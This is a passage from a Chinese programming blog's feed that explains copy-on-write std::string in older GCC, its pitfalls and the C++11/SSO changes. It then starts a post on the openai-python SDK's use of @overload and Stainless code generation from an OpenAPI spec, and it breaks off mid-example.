endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在业务生产环境上，用 G++ 4.9.3 编译上面的代码，运行结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Original: Hello, World!, address: 0x186c028</span><br><span class="line">Copy    : Hello, World!, address: 0x186c028</span><br><span class="line">After Modification:</span><br><span class="line">Original: Xello, World!, address: 0x186c028</span><br><span class="line">Copy    : Xello, World!, address: 0x186c028</span><br></pre></td></tr></table></figure><p>可以看到在修改副本后，<strong>原始字符串的内容也发生了变化</strong>。还有一点奇怪的是，原始字符串和副本的<strong>内存地址始终是一样的</strong>。这究竟是怎么回事呢？要解决这个疑问，我们需要先了解下 C++ string 的实现机制。</p><h2 id="字符串写时复制"><a href="#字符串写时复制" class="headerlink" title="字符串写时复制"></a>字符串写时复制</h2><p>在低版本的 GCC&#x2F;G++(5 版本以下) 中，string 类的实现采用了<strong>写时复制</strong>（Copy-On-Write，简称 COW）机制。当一个字符串对象被复制时，它<strong>并不立即复制整个字符串数据，而是与原始字符串共享相同的数据</strong>。只有在字符串的一部分被修改时（即“写入”时），才会创建数据的真实副本。COW 的优点在于它可以大幅度减少不必要的数据复制，特别是在字符串对象<strong>频繁被复制但很少被修改</strong>的场景下。</p><p>COW 的一般实现方式：</p><ul><li><strong>引用计数</strong>：string 对象内部通常包含一个指向字符串数据的指针和一个引用计数。这个引用计数表示有多少个 string 对象共享相同的数据。</li><li><strong>复制时共享</strong>：当一个 string 对象被复制时，它会简单地复制指向数据的指针和引用计数，而不是数据本身。复制后的字符串对象和原始对象共享相同的数据，并且引用计数增加。</li><li><strong>写入时复制</strong>：如果任何一个 string 对象试图修改共享的数据，它会首先检查引用计数。如果引用计数大于 1，表示数据被多个对象共享。在这种情况下，修改操作会先创建数据的一个新副本（即“复制”），然后对这个新副本进行修改。引用计数随后更新以反映共享情况的变化。</li></ul><p>COW 实现需要仔细管理内存分配和释放，以及引用计数的增加和减少，确保数据的正确性和避免内存泄漏。现在回到上面的复现代码，我们更改了复制后的字符串，但是从输出结果来看，并<strong>没有触发 COW 中的写复制，因为前后地址还是一样的</strong>。这是为什么呢？先来看 ModifyStringInplace 的实现，string 的 c_str() 方法返回一个<strong>指向常量字符数组</strong>的指针，设计上这里是只读的，<strong>不应该通过这个指针来修改字符串的内容</strong>。</p><p>但是上面的实现中，用 <code>const_cast</code> 移除了对象的 const（常量）属性，然后对内存上的数据进行了修改。通过指针<strong>直接修改底层数据的操作</strong>不会被 string 的内部机制（包括 COW）所识别到，因为它跳过了string 对外暴露接口的状态检查。如果把上面代码稍微改动下，用<code>[]</code>来修改字符串的内容，<code>str[0] = &#39;X&#39;</code>，那么就会触发 COW 的写复制，从而导致原始字符串的内容不会被修改。输出如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Original:</span> <span class="string">Hello,</span> <span class="string">World!,</span> <span class="attr">address:</span> <span class="number">0x607028</span></span><br><span class="line"><span class="attr">Copy    :</span> <span class="string">Hello,</span> <span class="string">World!,</span> <span class="attr">address:</span> <span class="number">0x607028</span></span><br><span class="line"><span class="attr">After Modification:</span></span><br><span class="line"><span class="attr">Original:</span> <span class="string">Hello,</span> <span class="string">World!,</span> <span class="attr">address:</span> <span class="number">0x607028</span></span><br><span class="line"><span class="attr">Copy    :</span> <span class="string">Xello,</span> <span class="string">World!,</span> <span class="attr">address:</span> <span class="number">0x607058</span></span><br></pre></td></tr></table></figure><p>其实用 <code>[]</code> 只读取字符串中某位的内容，也会触发写时复制。比如下面的代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    string original = <span class="string">&quot;Hello, World!&quot;</span>;</span><br><span class="line">    string copy = original;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 显示两个字符串的内存地址</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Original: &quot;</span> &lt;&lt; original &lt;&lt; <span class="string">&quot;, address: &quot;</span> &lt;&lt; <span class="built_in">static_cast</span>&lt;<span class="type">const</span> <span class="type">void</span>*&gt;(original.<span class="built_in">c_str</span>()) &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Copy    : &quot;</span> &lt;&lt;  copy &lt;&lt; <span class="string">&quot;, address: &quot;</span> &lt;&lt; <span class="built_in">static_cast</span>&lt;<span class="type">const</span> <span class="type">void</span>*&gt;(copy.<span class="built_in">c_str</span>()) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    copy[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">// 再次显示两个字符串的内存地址</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;After :&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Original: &quot;</span> &lt;&lt; original &lt;&lt; <span class="string">&quot;, address: &quot;</span> &lt;&lt; <span class="built_in">static_cast</span>&lt;<span class="type">const</span> <span class="type">void</span>*&gt;(original.<span class="built_in">c_str</span>()) &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Copy    : &quot;</span> &lt;&lt;  copy &lt;&lt; <span class="string">&quot;, address: &quot;</span> &lt;&lt; <span class="built_in">static_cast</span>&lt;<span class="type">const</span> <span class="type">void</span>*&gt;(copy.<span class="built_in">c_str</span>()) &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在低版本 G++ 上编译运行，可以看到用 operator[] 读取字符串后，复制内容的地址也发生了变化(从 <code>0x21f2028</code> 到 <code>0x21f2058</code>)，如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Original: Hello, World!, address: 0x21f2028</span><br><span class="line">Copy    : Hello, World!, address: 0x21f2028</span><br><span class="line">After Modification:</span><br><span class="line">Original: Hello, World!, address: 0x21f2028</span><br><span class="line">Copy    : Hello, World!, address: 0x21f2058</span><br></pre></td></tr></table></figure><p>这是因为 operator[] 返回的是对字符的引用，<strong>可以通过这个引用来修改字符串的内容</strong>，这个接口有”修改”字符串的语义，所以会触发写时复制。虽然上面代码实际并没有修改，但是 COW 机制本身很难感知到这里没修改，这里改成用迭代器 <code>begin()/end()</code> 也会有同样的问题。</p><h2 id="写时复制的缺点"><a href="#写时复制的缺点" class="headerlink" title="写时复制的缺点"></a>写时复制的缺点</h2><p>用 COW 实现 string 的好处是可以减少不必要的数据复制，但是它也有一些缺点。先看一个简单示例，参考 <a href="https://stackoverflow.com/questions/12199710/legality-of-cow-stdstring-implementation-in-c11">Legality of COW std::string implementation in C++11</a> 下的一个回答。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">std::string <span class="title">s</span><span class="params">(<span class="string">&quot;str&quot;</span>)</span></span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* p = s.<span class="built_in">data</span>();</span><br><span class="line">    &#123;</span><br><span class="line">        std::string copy = s;</span><br><span class="line">        std::cout &lt;&lt; s[<span class="number">0</span>] &lt;&lt; std::endl; <span class="comment">// cow: now s new allocation</span></span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; *p &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;  <span class="comment">// p is dangling</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 COW 机制下，当创建 copy 作为 s 的副本时，s 和 copy 实际上共享相同的底层数据，此时，p 指向的是这个共享数据的地址。然后 operator[] 导致 s 会触发重新分配内存，这时 p 对应内存部分的引用只有 copy 了。当 copy 的生命周期结束并被销毁，p 就成为<strong>悬空指针（dangling pointer）</strong>。后面访问悬空指针所指向的内存，这是<a href="https://selfboot.cn/2016/09/18/c++_undefined_behaviours/">未定义行为（undefined behavior）</a>，可能导致程序崩溃或者输出不可预测的结果。如果不使用 COW 机制，这里就不会有这个问题。</p><p>不过，就算是 C++11 及以后的标准中，标准库中的 std::string 不再使用 COW 机制了，<strong>保留指向字符串内部数据的指针仍然是一种不安全的做法</strong>，因为任何修改字符串的操作都<strong>可能导致重新分配内部缓冲区，从而使得之前的指针或引用变得无效</strong>。</p><h3 id="多线程问题"><a href="#多线程问题" class="headerlink" title="多线程问题"></a>多线程问题</h3><p>COW 写时复制除了带来上面这些潜在 bug 外，还有一个比较重要的缺陷，就是<strong>不适合多线程环境</strong>，详细可以阅读 <a href="https://www.open-std.org/jtc1/sc22/wg21/docs/papers/2008/n2534.html">Concurrency Modifications to Basic String</a> 这篇文章，COW 写时复制带来的问题就是：</p><blockquote><p>The current definition of basic_string allows only <strong>very limited concurrent access to strings</strong>. Such limited concurrency will inhibit performance in multi-threaded applications.</p></blockquote><p>举个简单的例子，如下对于原始字符串，这里先复制了几个副本，然后分别在不同的线程中运行。在 COW 的实现中，必须保证这里各个线程操作独立副本字符串是线程安全的，也就要求COW 的实现中，<strong>字符串中共享内存的引用计数必须是原子操作</strong>。原子操作本身需要开销，而且在多线程环境下，多个 CPU 对同一个地址的原子操作开销更大。如果不用 COW 实现，本来是<strong>可以避免这部分开销</strong>的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// StringOperations 这里修改字符串</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::string thread1 = <span class="string">&quot;Hello, World! This is a test string.&quot;</span>; <span class="comment">// 共享字符串</span></span><br><span class="line">    <span class="function">std::string <span class="title">thread2</span><span class="params">(thread1)</span></span>;</span><br><span class="line">    <span class="function">std::string <span class="title">thread3</span><span class="params">(thread1)</span></span>;</span><br><span class="line"></span><br><span class="line">    std::vector&lt;std::thread&gt; threads;</span><br><span class="line">    threads.<span class="built_in">emplace_back</span>(StringOperations, std::<span class="built_in">ref</span>(thread1));</span><br><span class="line">    threads.<span class="built_in">emplace_back</span>(StringOperations, std::<span class="built_in">ref</span>(thread2));</span><br><span class="line">    threads.<span class="built_in">emplace_back</span>(StringOperations, std::<span class="built_in">ref</span>(thread3));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; thread : threads) &#123;</span><br><span class="line">        thread.<span class="built_in">join</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然如果是不同线程之间共享同一个 string 对象，那么不管是不是写时复制，这里都要进行线程同步，才能保证线程安全，这里不做讨论了。</p><h2 id="C-11-标准改进"><a href="#C-11-标准改进" class="headerlink" title="C++11 标准改进"></a>C++11 标准改进</h2><p>鉴于上面提到的写时复制的缺点，GCC 编译器，从 5.1 开始不再用 COW 实现 string，可以参考 <a href="https://gcc.gnu.org/onlinedocs/libstdc++/manual/using_dual_abi.html">Dual ABI</a>：</p><blockquote><p>In the GCC 5.1 release libstdc++ introduced a new library ABI that includes new implementations of string and std::list. These changes were necessary to conform to the 2011 C++ standard which <strong>forbids Copy-On-Write strings</strong> and requires lists to keep track of their size.</p></blockquote><p>这里主要是因为 C++11 标准做了更改，<a href="https://www.open-std.org/jtc1/sc22/wg21/docs/papers/2013/n3690.pdf">21.4.1 basic_string general requirements</a> 中有这样的描述：</p><blockquote><p>References, pointers, and iterators referring to the elements of a basic_string sequence may be invalidated by the following uses of that basic_string object:</p><ul><li>as an argument to any standard library function taking a reference to non-const basic_string as an argument.</li><li>Calling non-const member functions, except operator[], at, front, back, begin, rbegin, end, and rend.</li></ul></blockquote><p>如果是 COW 实现的字符串，如前面的例子，<strong>只是调用 non-const operator[] 也会导致写时复制，从而导致原始字符串的引用失效</strong>。</p><h2 id="高版本字符串优化"><a href="#高版本字符串优化" class="headerlink" title="高版本字符串优化"></a>高版本字符串优化</h2><p>高版本的 GCC，特别是遵循 C++11 标准和之后版本的实现，对 std::string 的实现进行了显著的修改，主要是为了提高性能和保证线程安全。高版本的 GCC 放弃了 COW，同时对小字符串做了优化（SSO）。当字符串足够短以至于可以直接存储在 std::string 对象的内部缓冲区中时，它就会使用这个内部缓冲区(在栈中)，而不是分配单独的堆内存。这可以减少内存分配的开销，并提高访问小字符串时的性能。</p><p>可以用下面代码来验证下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    string a = <span class="string">&quot;short&quot;</span>;</span><br><span class="line">    string b = <span class="string">&quot;this is a long string here, hahahhh&quot;</span>;</span><br><span class="line">    cout &lt;&lt; &amp;a &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; <span class="built_in">static_cast</span>&lt;<span class="type">const</span> <span class="type">void</span>*&gt;(a.<span class="built_in">c_str</span>()) &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &amp;b &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; <span class="built_in">static_cast</span>&lt;<span class="type">const</span> <span class="type">void</span>*&gt;(b.<span class="built_in">c_str</span>()) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用高版本编译运行，可以看到输出类似下面结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7ffcb9ff22d0:0x7ffcb9ff22e0</span><br><span class="line">0x7ffcb9ff22b0:0x421eb0</span><br></pre></td></tr></table></figure><p>对于比较短的字符串，地址和变量本身地址十分接近，说明就在栈上。而对于比较长的字符串，地址和变量本身地址相差很大，说明是在堆上分配的。对于较长的字符串，高版本的 GCC 实现了更有效的动态内存分配和管理策略，包括避免不必要的内存重新分配，以及在增长字符串时采用增量或倍增的容量策略，以减少内存分配次数和提高内存利用率。</p>]]></content>
    
    
    <summary type="html">本文通过示例代码复现字符串副本被修改后原字符串也跟着改变的问题，针对性地分析了问题根源。然后全面地讲解了写时复制的原理及存在的缺陷，如引起潜在内存错误、不适合多线程等。最后介绍C++11标准是如何修改约束和高版本字符串的SSO优化。</summary>
    
    
    
    <category term="程序设计" scheme="https://selfboot.cn/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
    
    <category term="C++" scheme="https://selfboot.cn/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>跟 OpenAI 学写 ChatGPT API 的 Python SDK 库</title>
    <link href="https://selfboot.cn/2024/01/09/openai_python_sdk_learn/"/>
    <id>https://selfboot.cn/2024/01/09/openai_python_sdk_learn/</id>
    <published>2024-01-09T17:02:21.000Z</published>
    <updated>2024-06-07T06:32:37.901Z</updated>
    
    <content type="html"><![CDATA[<p>ChatGPT 问世后，OpenAI 就开源了模型调用的 Python 库 <a href="https://github.com/openai/openai-python">openai-python</a>。这个库功能十分齐全，封装了 OpenAI 对外公布的 API，使用起来也十分简单。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20230831_openai_python_source_summary.webp" alt="OpenAI-python 库的封装"></p><p>这个库的第一个版本，实现了 ChatGPT 各种 API 的参数封装 Python 抽象类和调用方法，通过 requests 和 aiohttp 库来发送同步或者异步 HTTP 请求。整体来说，对外接口良好，很容易就会使用。并且整体源码实现有很好的逻辑抽象，用了很多 Python 高级特性，代码写的很漂亮，值得学习。但是从本质上讲，这还是 “<strong>API boy</strong>“ 的工作，更多是重复体力劳动，没有太多技术含量。</p><p>于是，OpenAI 在 2023 年 11 月，开始引入 <a href="https://www.stainlessapi.com/">Stainless</a>，自此不用再手工编写 SDK 代码。每次只用提供 API 协议更新，然后就能自动生成代码，<span style='color: red'>摆脱了重复体力劳动</span>。具体是在 <a href="https://github.com/openai/openai-python/pull/677">Pull 677</a> 中引入新的代码，并且作为正式的 V1 版本发布。</p><span id="more"></span><h2 id="手动打造的-SDK"><a href="#手动打造的-SDK" class="headerlink" title="手动打造的 SDK"></a>手动打造的 SDK</h2><p>最开始的 Python SDK 可以称之为<strong>手动打造的 SDK</strong>，代码全部手工写好，和 API 耦合在一起。整体目录结构如下：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240108_openai_python_sdk_learn_old_ver.png" alt="openai-python 库的老的代码版本"></p><p>这个版本的代码，整体结构还是比较清晰的，我用 <a href="https://pylint.readthedocs.io/en/latest/pyreverse.html">Pyreverse</a> 和 <a href="https://graphviz.org/">graphviz</a> 为 openapi-sdk 生成了类图，去掉一些不重要的类之后，整体的类依赖关系如下：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20230829_openai_python_source_classes_core.png" alt="openai python 库的核心类图"></p><p>其中有个基础的类 OpenAIObject，里面定义一些基本的字段，比如 api_key, api_version 等，平时用到的 ChatCompletion 类间接继承自这个类。另外还有 OpenAIError 和 APIRequestor 两个类，分别用于处理错误以及发送 HTTP 请求。OpenAI 的代码用到了不少高级的 Python 特性，这里以 overload 装饰器为例，下面来详细看看。当然，如果对 Pyhton 不感兴趣，可以跳过这部分，<strong>直接看后面的自动化生成部分</strong>。</p><h3 id="overload-装饰器"><a href="#overload-装饰器" class="headerlink" title="overload 装饰器"></a>overload 装饰器</h3><p><a href="https://github.com/openai/openai-python/blob/284c1799070c723c6a553337134148a7ab088dd8/openai/api_requestor.py#L221">openai-python&#x2F;openai&#x2F;api_requestor.py</a> 中的 APIRequestor 类有很多 overload 修饰的方法，这是 Python 3.5 新增的语法，属于 <a href="https://docs.python.org/3/library/typing.html#typing.overload">typeing 包</a>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">APIRequestor</span>:</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line"><span class="meta">    @overload</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">request</span>(<span class="params"></span></span><br><span class="line"><span class="params">        self,</span></span><br><span class="line"><span class="params">        method,</span></span><br><span class="line"><span class="params">        url,</span></span><br><span class="line"><span class="params">        params=...,</span></span><br><span class="line"><span class="params">        headers=...,</span></span><br><span class="line"><span class="params">        files=...,</span></span><br><span class="line"><span class="params">        *,</span></span><br><span class="line"><span class="params">        stream: <span class="type">Literal</span>[<span class="literal">True</span>],</span></span><br><span class="line"><span class="params">        request_id: <span class="type">Optional</span>[<span class="built_in">str</span>] = ...,</span></span><br><span class="line"><span class="params">        request_timeout: <span class="type">Optional</span>[<span class="type">Union</span>[<span class="built_in">float</span>, <span class="type">Tuple</span>[<span class="built_in">float</span>, <span class="built_in">float</span>]]] = ...,</span></span><br><span class="line"><span class="params">    </span>) -&gt; <span class="type">Tuple</span>[Iterator[OpenAIResponse], <span class="built_in">bool</span>, <span class="built_in">str</span>]:</span><br><span class="line">        <span class="keyword">pass</span> </span><br><span class="line">    <span class="comment"># ...</span></span><br></pre></td></tr></table></figure><p>在 Python 中，使用 <code>@overload</code> 装饰器定义的方法重载<strong>仅用于类型检查和文档，它们实际上不会被执行</strong>。这些重载主要是为了提供更准确的类型信息，以便在使用静态类型检查器（如 mypy）或 IDE（如 PyCharm）时能够得到更准确的提示和错误检查。</p><p>使用 @overload 可以更准确地描述一个函数或方法<strong>在不同参数组合下的行为</strong>。实际的实现是在没有 <code>@overload</code> 装饰器的 request 方法中。这个方法通常会使用条件语句（如 if、elif、else）或其他逻辑来根据不同的参数组合执行不同的操作。上面 overload 修饰的 4 个 request 方法，实际上是定义了4个不同的方法，分别接受不同的参数组合，返回不通的类型值。</p><p>上面代码请求参数解释：</p><ul><li><code>files=...</code>：这里的 files&#x3D;… 表示 files 参数是可选的，但类型没有明确指定。在 Python 的类型提示中，<code>...</code>（省略号）通常用作占位符，表示“这里应该有内容，但尚未指定”。</li><li><code>stream: Literal[True]</code>：这里的 stream: <code>Literal[True]</code> 表示 stream 参数必须是布尔值 True。Literal 类型用于指定一个变量只能是特定的字面值，这里就是 True。</li><li><code>request_id: Optional[str] = ...</code>：这里的 <code>Optional[str]</code> 表示 request_id 参数可以是 str 类型，也可以是 None。Optional 在类型提示中通常用于表示一个值可以是某种类型或 None。这里的 <code>= ...</code> 同样是一个占位符，表示默认值尚未指定。在实际的方法实现中，这通常会被一个实际的默认值替换。</li></ul><p>举一个相对简单的例子，假设我们有一个函数 add，它可以接受两个整数或两个字符串，但不能接受一个整数和一个字符串，使用 @overload 的情况：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Union</span>, overload</span><br><span class="line"></span><br><span class="line"><span class="meta">@overload</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a: <span class="built_in">int</span>, b: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"><span class="meta">@overload</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a: <span class="built_in">str</span>, b: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a: <span class="type">Union</span>[<span class="built_in">int</span>, <span class="built_in">str</span>], b: <span class="type">Union</span>[<span class="built_in">int</span>, <span class="built_in">str</span>]</span>) -&gt; <span class="type">Union</span>[<span class="built_in">int</span>, <span class="built_in">str</span>]:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(a, <span class="built_in">int</span>) <span class="keyword">and</span> <span class="built_in">isinstance</span>(b, <span class="built_in">int</span>):</span><br><span class="line">        <span class="keyword">return</span> a + b</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">isinstance</span>(a, <span class="built_in">str</span>) <span class="keyword">and</span> <span class="built_in">isinstance</span>(b, <span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> a + b</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&quot;Invalid types&quot;</span>)</span><br></pre></td></tr></table></figure><p>添加注解后的好处有：</p><ul><li>类型检查：使用 <code>@overload</code> 后，如果尝试传入一个整数和一个字符串到 add 函数，静态类型检查器会立即报错，而不需要等到运行时。</li><li>代码可读性：通过查看 <code>@overload</code> 定义，其他开发者可以更容易地理解 add 函数接受哪些类型的参数，以及在不同情况下的返回类型。</li><li>IDE 支持：在像 <code>PyCharm</code> 这样的 IDE 中，<code>@overload</code> 可以提供更准确的自动完成和参数提示。</li><li>文档：<code>@overload</code> 也可以作为文档，说明函数或方法的不同用法。</li></ul><p>上面的 <code>add</code> 函数，如果你这样调用： print(add(1, “2”))，mypy 就能检查出错误，不用到运行时才发现：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">override.py:22: error: No overload variant of &quot;add&quot; matches argument types &quot;int&quot;, &quot;str&quot;  [call-overload]</span><br><span class="line">override.py:22: note: Possible overload variants:</span><br><span class="line">override.py:22: note:     def add(a: int, b: int) -&gt; int</span><br><span class="line">override.py:22: note:     def add(a: str, b: str) -&gt; str</span><br></pre></td></tr></table></figure><h2 id="引入-stainless-重构库"><a href="#引入-stainless-重构库" class="headerlink" title="引入 stainless 重构库"></a>引入 stainless 重构库</h2><p>上面是比较传统的根据 API 接口定义来生成 Client 代码的方式。其实很多程序员日常的工作类似这种，提供 API 的各种参数然后去调用，或者是提供对外的接口，这就是所谓的 API boy。</p><p>OpenAI 的程序员，显然不满足于做一个 API boy，从仓库的提交记录中可以看到，在 2023.11 在 V1 中做了比较大的改动，使用 stainless 来生成代码，并且随后就引入了 <code>stainless-bot</code> 机器人。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240108_openai_python_sdk_learn_stainless_bot.png" alt="开始引入 stainless-bot 机器人"></p><p><a href="https://www.stainlessapi.com/">stainless</a> 是一个开源的 API SDK 生成工具，可以根据 API 协议定义，自动生成对应的代码。你只需要提供 API 接口文件，也就是 <a href="https://www.openapis.org/">OpenAPI Specification</a> 文件，然后就会生成各种语言的 SDK 了。目前(2024.01)支持 TypeScript, Node, Python, Java, Go, Kotlin 等语言。</p><p>这里生成的<strong>代码质量也是有保障的</strong>，按照文档所说，会尽量让自动生成的代码和<strong>专家级别的人写的代码</strong>一样。生成的库还会支持丰富的<strong>类型校验</strong>，可以用于自动补全和 IDE 中光标悬停时的文档提示，另外还<strong>支持带退避的自动重试</strong>，以及身份验证等。每次 API 接口有新的变更，只有更新 API 协议定义文件，然后用 Github Action 推送给 stainless，就能自动生成新的代码，接着给你的仓库提供一个 Pull Request。</p><p>听起来很美好，只用改下协议，然后就有生成的代码了，整个过程不用人去写代码，也没有重复体力劳动了。我们来看看 OpenAI 的 SDK 最近提交记录，基本都是 stainless-bot 提交的代码了。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240108_openai_python_sdk_learn_bot_commit.png" alt="stainless-bot 机器人成为代码的主要提交者"></p><p>这里其实还有点疑问，stainless-bot 的更新<a href="https://github.com/openai/openai-python/pull/829/files">feat(client): support reading the base url from an env variable</a>，支持从环境变量读取 OPENAI_BASE_URL，但是在 <strong>API spec 里面并没有看到相关说明</strong>，不知道这里的更新 stainless-bot 是怎么产生的。</p><p>另外值得注意的是，这次重构是<strong>破坏了兼容性</strong>的，改变了库的调用方式，因此老版本的调用代码需要做出改变。OpenAI 也给出了一个迁移指导文档 <a href="https://github.com/openai/openai-python/discussions/742">v1.0.0 Migration Guide</a>，还提供了自动化迁移脚本，可以一键迁移。</p><h2 id="OpenAPI-Specification"><a href="#OpenAPI-Specification" class="headerlink" title="OpenAPI Specification"></a>OpenAPI Specification</h2><p>根据 stainless 的说法，自动化生成代码的依据就是 OpenAPI 描述文件，具体协议可以参考文档 <a href="https://spec.openapis.org/oas/latest.html">OpenAPI Specification</a>。<strong>OpenAPI 主要用于设计、构建、文档化和使用 RESTful Web 服务</strong>。它提供了一种标准化的方法来描述 RESTful 接口，方便<strong>开发者用 YAML 或 JSON 格式定义 API 的请求路径、参数、响应、安全性等</strong>。有了描述文件，就可以<strong>自动化生成人类可读的文档，创建自动化测试，包括生成客户端 SDK</strong>等。</p><p>OpenAI ChatGPT 的 API 定义也是开源的，在 Github 仓库 <a href="https://github.com/openai/openai-openapi">openai-openapi</a> 中，2.0 版本的 API 接口定义在<a href="https://github.com/openai/openai-openapi/blob/3d9e0aeb21ec75aa616aa4c17ea54c369e344cd0/openapi.yaml">这里</a>可以看到。</p><p>这里以 <code>/chat/completions</code> 接口为例，来看看一个接口要定义哪些内容。首先是一些元信息：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 